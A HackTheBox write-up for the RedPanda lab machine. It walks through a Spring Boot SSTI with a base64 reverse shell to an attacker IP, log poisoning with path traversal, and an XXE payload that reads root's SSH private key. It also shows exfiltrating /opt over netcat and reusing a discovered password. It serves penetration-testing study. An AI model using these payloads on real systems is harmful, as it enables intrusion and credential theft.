---
render_with_liquid: false
title: HackTheBox Writeup  RedPanda
date: 2023-10-14 19:45:44 +1400
tags: [hackthebox, nmap, linux, feroxbuster, java, spring-boot, ssti, ffuf, char-blacklist-bypass, xonsh, jq, pspy, forensics, source-code-analysis, log-poisoning, exiftool, directory-traversal, xxe, discover-secrets]
---



RedPanda is an easy Linux machine that features a website with a search engine made using the Java Spring Boot framework. This search engine is vulnerable to Server-Side Template Injection and can be exploited to gain a shell on the box as user `woodenk`. Enumerating the processes running on the system reveals a `Java` program that is being run as a cron job as user `root`. Upon reviewing the source code of this program, we can determine that it is vulnerable to XXE. Elevation of privileges is achieved by exploiting the XXE vulnerability in the cron job to obtain the SSH private key for the `root` user. We can then log in as user `root` over SSH and obtain the root flag.


# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Sat Oct 14 19:45:43 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,8080 10.129.227.207
Nmap scan report for 10.129.227.207
Host is up, received user-set (0.063s latency).
Scanned at 2023-10-14 19:45:44 CST for 29s

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
8080/tcp open  http-proxy syn-ack ttl 63
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sat, 14 Oct 2023 11:45:39 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sat, 14 Oct 2023 11:45:39 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 14 Oct 2023 11:45:41 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=10/14%Time=652A7F6F%P=x86_64-pc-linux-gnu%r(G
...
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></htm
SF:l>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Oct 14 19:46:13 2023 -- 1 IP address (1 host up) scanned in 29.79 seconds
```


## 8080 - Red Panda Search


### Info

```perl
http://redpanda.htb:8080 [200] [Red Panda Search | Made with Spring Boot] [] [50de4e5784a67dea4ce81aefbdd302f7e399c371]
```

![](/assets/obsidian/c16e7cdb9757dbf359874a48f035176a.png)

### Directory

```bash
feroxbuster -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox_8080.txt -u http://redpanda.htb:8080/
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ cat ferox_8080.txt|awk '$1!=400'
405      GET        1l        3w      117c http://redpanda.htb:8080/search
200      GET       32l       97w      987c http://redpanda.htb:8080/stats
200      GET       54l      102w      822c http://redpanda.htb:8080/css/stats.css
200      GET       22l       41w      295c http://redpanda.htb:8080/css/main.css
200      GET      275l      763w     7549c http://redpanda.htb:8080/css/panda.css
200      GET       55l      119w     1543c http://redpanda.htb:8080/
500      GET        1l        1w       86c http://redpanda.htb:8080/error
```


# User Flag
---

## Enumeration

Visit `/seaerch` and got an error message

![](/assets/obsidian/73783816691c33a441a495285e508a94.png)

Confirmed the site was built with **springboot** by googling the message

![](/assets/obsidian/9e54c8dbdae80f62c98f13acb1a5f1d9.png)

Try single quote

![](/assets/obsidian/1c993f8ba64de87e1b289df73f7266c0.png)

Search for nothing

![](/assets/obsidian/5b4a19353c7527eb519437998ca6c43e.png)

Found banned character

```bash
ffuf -c -request search.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -mc all -fw 156
```

![](/assets/obsidian/b8c1065bc54bbdc81daf044a908d53fc.png)

![](/assets/obsidian/f0821aa96f74ac65943d103bb4af8d06.png)


## Shell as woodenk

### SSTI


#### Find payload

Google : `java spring ssti payload`

> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---spring

They payload works, but I'm going to do another way by fuzzing with custom wordlist

#### Collect banned characters

```bash
ffuf -c -request search.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt --mc 400 -mr 'banned' -o banned_chars.ffuf
```

![](/assets/obsidian/56eb9fbc3e1fa7f9fdcbd147bc00f94a.png)

Save to wordlist

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ cat banned_chars|jq '.results[].input.FUZZ' -r > banned_chars.txt
```

#### Make a custom wordlist by excluding banned characters

Filter bad characters from wordlist

Using **python** + **bash** environment via **[xonsh](https://github.com/xonsh/xonsh)**

```bash
xonsh
```

```bash
bravosec@fsociety ~/htb/RedPanda @ banned = $(cat banned_chars.txt).splitlines()
bravosec@fsociety ~/htb/RedPanda @ wordlist = [l for l in $(cat /opt/wordlists/Auto_Wordlists/wordlists/ssti.txt).splitlines() if not any(b for b in banned if b in l)]
bravosec@fsociety ~/htb/RedPanda @ echo -e @("\n".join(wordlist)) > custom_ssti.txt
```


#### Fuzz SSTI

```bash
ffuf -c -request search.req -request-proto http -w custom_ssti.txt -mc all -o ssti.ffuf
```

![](/assets/obsidian/9b16f623cd24d15657c029a5c7f6be0f.png)

Filter out the most retuned lines : `29`

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ cat ssti.ffuf|jq -c '.results[] | select(.lines != 29) | .input.FUZZ' -r
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
@(1+2)
@(6+5)
```

Use the one that executes `getRuntime()`

![](/assets/obsidian/b89ffa9409f5e6f695667292827cdb97.png)

#### Get reverse shell

In order to get reverse shells with `getRuntime()`, we'll have to craft special payloads

Since `$` is banned to for `${IFS}` trick, I'll use base64

> Make sure `=` symbol is escaped (Add spaces in revshell string if it appears)
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ echo 'bash -i >& /dev/tcp/10.10.16.16/1111 0>&1'|base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNi8xMTExIDA+JjEK 
```

Payload : 

```bash
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNi8xMTExIDA+JjEK}|{base64,-d}|{bash,-i}'))}
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.16] from (UNKNOWN) [10.129.227.207] 51182
bash: cannot set terminal process group (864): Inappropriate ioctl for device
bash: no job control in this shell
woodenk@redpanda:/tmp/hsperfdata_woodenk$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<nk$ python3 -c 'import pty; pty.spawn("/bin/bash")'
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

woodenk@redpanda:/tmp/hsperfdata_woodenk$ export TERM=xterm
woodenk@redpanda:/tmp/hsperfdata_woodenk$ id
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat ~/user.txt
cat ~/user.txt
e98c93d463ef163c636a5092ff056f13
woodenk@redpanda:/tmp/hsperfdata_woodenk$
```

# Root Flag
---

## From woodenk to root


### redpanda.log

```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
```

```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd /opt
woodenk@redpanda:/opt$ ls -la
total 24
drwxr-xr-x  5 root root 4096 Jun 23  2022 .
drwxr-xr-x 20 root root 4096 Jun 23  2022 ..
-rwxr-xr-x  1 root root  462 Jun 23  2022 cleanup.sh
drwxr-xr-x  3 root root 4096 Jun 14  2022 credit-score
drwxr-xr-x  6 root root 4096 Jun 14  2022 maven
drwxrwxr-x  5 root root 4096 Jun 14  2022 panda_search

woodenk@redpanda:/opt$ cat cleanup.sh

#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

Start **pspy**

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ rlwrap nc -lvnp 1111
listening on [any] 1111 ...
cd /tmp && wget 10.10.16.16/pspy64 && chmod +x ./pspy64 && ./pspy64 -f
```

![](/assets/obsidian/ca12e0c42748bd662e5240b0d5d03749.png)

But I have no permissions to write in any files in `/opt`

```bash
woodenk@redpanda:~$ find /opt -user $USER -writable -ls 2>/dev/null
```

Since we have a group `logs`, check what it owns

```bash
woodenk@redpanda:/opt$ find / \( -path /run -o -path /sys -o -path /proc -o -path /var/lib \) -prune -o -group logs -ls 2>/dev/null
```

This file belongs to root but have `logs` group set

![](/assets/obsidian/c30d4befcd9129afbc359ceafaf52098.png)

```bash
woodenk@redpanda:/opt$ cd  /opt/panda_search/
woodenk@redpanda:/opt/panda_search$ ls -la
total 48
drwxrwxr-x 5 root root  4096 Jun 14  2022 .
drwxr-xr-x 5 root root  4096 Jun 23  2022 ..
drwxrwxr-x 3 root root  4096 Jun 14  2022 .mvn
-rwxrwxr-x 1 root root 10122 Jun 14  2022 mvnw
-rw-rw-r-- 1 root root  6603 Feb 21  2022 mvnw.cmd
-rw-rw-r-- 1 root root  2577 Apr 27  2022 pom.xml
-rw-rw-r-- 1 root logs     1 Oct 14 17:48 redpanda.log
drwxrwxr-x 4 root root  4096 Jun 14  2022 src
drwxrwxr-x 9 root root  4096 Jun 22  2022 target
woodenk@redpanda:/opt/panda_search$ cat redpanda.log

woodenk@redpanda:/opt/panda_search$
```

Find the sources which writes `redpanda.log`

```bash
woodenk@redpanda:/opt/panda_search$ grep -Rin redpanda.log
Binary file target/classes/com/panda_search/htb/panda_search/RequestInterceptor.class matches
src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java:34:        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
```

```bash
woodenk@redpanda:/opt/panda_search$ stty rows 50 cols 209
woodenk@redpanda:/opt/panda_search$ vi src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java
```

![](/assets/obsidian/b0573a9e3ef94216ebfd3d5d50132381.png)

It logs web request to `redpanda.log`, but it was cleared via cron jobs

Test it out

```bash
woodenk@redpanda:~$ tail -F /opt/panda_search/redpanda.log

405||10.10.16.16||Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0||/error
404||10.10.16.16||Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0||/favicon.ico
404||10.10.16.16||Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0||/error
404||10.10.16.16||Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0||/.env
404||10.10.16.16||Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0||/error
tail: /opt/panda_search/redpanda.log: file truncated

```

### Analyze /opt/panda_search/

Search for more references to the log file

```bash
woodenk@redpanda:/opt$ grep -Rin redpanda.log
Binary file panda_search/target/classes/com/panda_search/htb/panda_search/RequestInterceptor.class matches
panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java:34:        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
Binary file credit-score/LogParser/final/target/classes/com/logparser/App.class matches
credit-score/LogParser/final/src/main/java/com/logparser/App.java:91:        File log_fd = new File("/opt/panda_search/redpanda.log");
```

```bash
woodenk@redpanda:/opt$ vi credit-score/LogParser/final/src/main/java/com/logparser/App.java
```

> `main`

![](/assets/obsidian/45e6c4c3a6ab79fa9dd718ce409b2be9.png)

> `getArtist`

![](/assets/obsidian/664868c5042f5e5a90744e56dd900443.png)

> `parseLog`

![](/assets/obsidian/aa10604caada4d7974e5d2e4b7d3ba06.png)

> `addViewTo`

![](/assets/obsidian/56885a061559850bc01b703793a246df.png)

#### Summary

1. This App will log web requests to `/opt/panda_search/redpanda.log`
2. Counts the view of each images from `redpanda.log`
3. Parses **artist name** from image's metadata at `"/opt/panda_search/src/main/resources/static" + uri`
4. Saves the count to `/credits/<artist_name>_creds.xml`
5. Parses `/credits/<artist_name>_creds.xml` to add to web view, the progress will be vulnerable to **XXE**

Check the changes of `/credits/<artist_name>_creds.xml`

```bash
watch -c -t -d 'cat /credits/*'
```

Visit some images, and wait for cron job to parse logs

![](/assets/obsidian/42fce563a3b1ab759a423360c744a288.png)

![](/assets/obsidian/5fc4aaef1eece1cac7a4dbf7034670fc.png)

### Log poisoning

> To point to our image : `"/opt/panda_search/src/main/resources/static" + uri

We can't write images to `/opt/panda_search/src/main/resources/static/`

```bash
woodenk@redpanda:~$ find /opt/panda_search/src/main/resources/static -writable -ls 2>/dev/null
    25094      8 -rw-rw-rw-   1 root     root         7549 Jun 22  2022 /opt/panda_search/src/main/resources/static/css/panda.css
```

But we can control `uri` in logs with directory traversal

```bash
woodenk@redpanda:~$ find /opt/ -writable -ls 2>/dev/null
    25020      8 -rw-rw-rw-   1 root     root         7427 Jun 22  2022 /opt/panda_search/target/panda.css.map
    25034      8 -rw-rw-rw-   1 root     root         7549 Jun 22  2022 /opt/panda_search/target/classes/static/css/panda.css
    25119      4 -rw-rw-r--   1 root     logs            1 Oct 15 09:34 /opt/panda_search/redpanda.log
    25094      8 -rw-rw-rw-   1 root     root         7549 Jun 22  2022 /opt/panda_search/src/main/resources/static/css/panda.css
```

Tamper the log file

```bash
echo '200||127.0.0.1||Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0||/../../../../../../tmp/ok.jpg' > /opt/panda_search/redpanda.log
```

### XXE

> To tamper `/credits/<artist_name>_creds.xml`

We have control to `artist_name` by adding metadata to images, but we can't write files to `/credits/`

```bash
woodenk@redpanda:~$ find /credits/ -writable -ls 2>/dev/null
woodenk@redpanda:~$
```

But we can do path traversal in `artist` metadata

`../dev/shm/test` -> `/dev/shm/test_creds.xml`

Set artist field in our custom image

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ cp ~/Pictures/HackerCat.jpg ./test.jpg

┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ exiftool -artist='../dev/shm/test' test.jpg
    1 image files updated
```

Write the payload to `/dev/shm/test_creds.xml`

```bash
vi /dev/shm/test_creds.xml
```

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/.ssh/id_rsa'>]><test>&test;</test>
```


### Trigger XXE by log poisoning

Transfer `jpg` file

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ mkdir -p www&&cd www

┌──(bravosec㉿fsociety)-[~/htb/RedPanda/www]
└─$ mv ../test.jpg .

┌──(bravosec㉿fsociety)-[~/htb/RedPanda/www]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
woodenk@redpanda:~$ wget 10.10.16.16/test.jpg -O /dev/shm/test.jpg
```

Monitor xml file change

```bash
woodenk@redpanda:~$ watch -c -t -d 'cat /dev/shm/test_creds.xml'
```

Poison the log file to trigger **XXE**

```bash
woodenk@redpanda:~$ echo '200||127.0.0.1||Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0||/../../../../../../dev/shm/test.jpg' > /opt/panda_search/redpanda.log
```

![](/assets/obsidian/a44ed4b91e5d7d14f2ea13078ffae257.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ vi root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ chmod 600 root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ ssh -i root.id_rsa root@redpanda.htb
root@redpanda:~# id
uid=0(root) gid=0(root) groups=0(root)
root@redpanda:~# cat root.txt
7d868a5c7fa76afede68a98da6d2e917
```


# Additional
---

## Learnt

- For harvesting, not only search for `passw`, `pass`, `secret` strings, but search for target **username** too

## Failed Attempts


### Credential Harvesting

I'm gonna exfiltrate the `/opt` directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda/loot]
└─$ nc -lvnp 443 > opt.tar
```

```bash
woodenk@redpanda:/opt$ tar -czf /dev/shm/temp.tar /opt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda/loot]
└─$ tar -xvzf opt.tar

┌──(bravosec㉿fsociety)-[~/htb/RedPanda/loot]
└─$ cd opt
```

Check hardcoded credentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda/loot/opt]
└─$ whispers . 2>/dev/null|jq .
```

Nothing interesting

![](/assets/obsidian/e3df4e8193017c9b900072cb2fad6ae2.png)


## Discover SSH password


### Via Trufflehog

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda/loot/opt]
└─$ trufflehog filesystem .
```

`jdbc` connection string

![](/assets/obsidian/18501888f693540400ed56174f26a01c.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda/loot/opt]
└─$ grep -rin wood
```

![](/assets/obsidian/c74901c5fdeca84a9b5f3711d19a7aa8.png)


### Via Snyk

![](/assets/obsidian/ccf1bedbd5721343ee6abf95060a8ba4.png)

![](/assets/obsidian/2c702d9c45ef5fb57fd987b61df51cf2.png)


### SSH

```bash
┌──(bravosec㉿fsociety)-[~/htb/RedPanda]
└─$ cssh woodnek@redpanda.htb 'RedPandazRule'
woodenk@redpanda:~$ id
uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)
```

> Note that we will lost `logs` group with SSH, that was because the web APP was configured to start with the `logs` group in cronjob